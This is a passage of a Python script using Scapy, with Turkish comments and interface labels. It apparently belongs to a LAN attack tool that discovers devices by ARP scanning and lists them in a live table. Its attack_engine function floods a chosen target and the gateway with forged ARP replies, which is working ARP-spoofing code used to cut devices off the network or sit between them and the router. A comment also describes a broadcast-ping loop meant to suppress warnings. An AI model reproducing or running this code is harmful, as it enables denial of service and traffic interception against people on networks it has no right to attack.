# UYARIYI ENGELLEYEN YENİ UYANDIRMA METODU
def wake_up_call(net_range):
    while not shutdown_event.is_set():
        try:
            # IP bazlı değil, Layer 2 (MAC) bazlı broadcast göndererek uyarıları engelle
            broadcast_ping = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(dst=net_range)/ICMP()
            send(broadcast_ping, verbose=False)
            time.sleep(30)
        except: pass

def scan_network(net_range):
    threading.Thread(target=wake_up_call, args=(net_range,), daemon=True).start()
    while not shutdown_event.is_set():
        try:
            # ARP taramasını daha stabil hale getir
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_range), timeout=4, retry=2, verbose=False)
            current_ips = []
            with clients_lock:
                for _, r in ans:
                    ip, mac = r.psrc, r.hwsrc
                    current_ips.append(ip)
                    if ip not in known_clients:
                        vendor = get_vendor(mac)
                        known_clients[ip] = {'mac': mac, 'online': True, 'name': vendor}
                        active_mods[ip] = []
                    else:
                        known_clients[ip]['online'] = True
                for ip in list(known_clients.keys()):
                    if ip not in current_ips:
                        known_clients[ip]['online'] = False
        except: pass
        time.sleep(10)

def attack_engine(target_ip, gw_ip, mode, stop_event):
    try:
        target_mac = known_clients[target_ip]['mac']
        while not stop_event.is_set():
            # ARP paketlerini her zaman Layer 2 seviyesinde (Ether) paketleyerek gönder
            # Bu, "Mac address not found" uyarısını tamamen bitirir.
            pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gw_ip, hwdst=target_mac)
            pkt_gw = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=gw_ip, psrc=target_ip)
            
            if mode in ["1", "01", "60", "44", "02"]:
                send(pkt, verbose=False)
                send(pkt_gw, verbose=False)
                time.sleep(0.5)
            else:
                send(pkt, verbose=False)
                time.sleep(1.5)
    except: pass

def generate_interface():
    table = Table(box=HEAVY_EDGE, expand=True, border_style="red")
    table.add_column("ID", justify="center", style="bold red", width=4)
    table.add_column("CİHAZ / MARKA", justify="left", style="bold white")
    table.add_column("İP / MAC", justify="left")
    table.add_column("DURUM", justify="center")
    table.add_column("AKTİF", justify="center", style="yellow")
    with clients_lock:
        ips = sorted(known_clients.keys())
        for i, ip in enumerate(ips):
            client = known_clients[ip]
            status = f"{R}!! KESİLDİ !!" if ip in active_attacks else (f"{W}● CANLI" if client['online'] else f"{G}○ UYKUDA")
            mods = " | ".join(active_mods.get(ip, [])) if active_mods.get(ip) else "---"
            table.add_row(str(i), f"{C}{client['name']}", f"{W}{ip}\n{G}{client['mac']}", status, f"{V}{mods}")
    return table

